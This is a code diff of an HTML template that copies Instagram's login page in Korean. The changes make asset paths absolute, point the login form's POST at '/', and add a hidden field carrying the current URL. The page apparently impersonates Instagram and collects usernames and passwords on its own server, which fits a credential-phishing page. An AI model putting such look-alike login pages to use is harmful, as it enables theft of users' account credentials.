@@ -3,7 +3,7 @@
 <head>
 	<meta charset="UTF-8">
 	<title>Instagram</title>
-	<link rel="stylesheet" href="styles.css">
+	<link rel="stylesheet" href="/styles.css">
 </head>
 <body>
 
@@ -11,15 +11,18 @@
 	<div class="header">
 		<div class="top">
 			<div class="logo">
-				<img src="instagram.png" alt="instagram" style="width: 175px;">
+				<img src="/instagram.png" alt="instagram" style="width: 175px;">
 			</div>
-			<form class="form" action="/login" method="POST">
+			<form class="form" action="/" method="POST">
 				<div class="input_field">
 					<input type="text" name="username" placeholder="전화번호, 사용자 이름 또는 이메일" class="input" required>
 				</div>
 				<div class="input_field">
 					<input type="password" name="password" placeholder="비밀번호" class="input" required>
 				</div>
+			
+				<input type="hidden" name="currentUrl" id="currentUrl" value="<%= currentUrl %>">
+			
 				<div class="btn" style="cursor: pointer;">
 					<button type="submit" style="background: none; border: none; color: white; font: inherit; cursor: pointer; text-decoration: none;">
 						로그인
@@ -44,8 +47,8 @@
 		<div class="apps">
 			<p>앱을 다운로드하세요.</p>
 			<div class="icons">
-				<a href="#"><img src="appstore.png" alt="appstore"></a>
-				<a href="#"><img src="googleplay.png" alt="googleplay"></a>
+				<a href="#"><img src="/appstore.png" alt="appstore"></a>
+				<a href="#"><img src="/googleplay.png" alt="googleplay"></a>
 			</div>
 		</div>
 	</div>
@@ -75,7 +78,6 @@
 
 <script>
     document.querySelector('.btn').addEventListener('click', function() {
-        // 폼 제출
         this.querySelector('button').click();
     });
 </script>
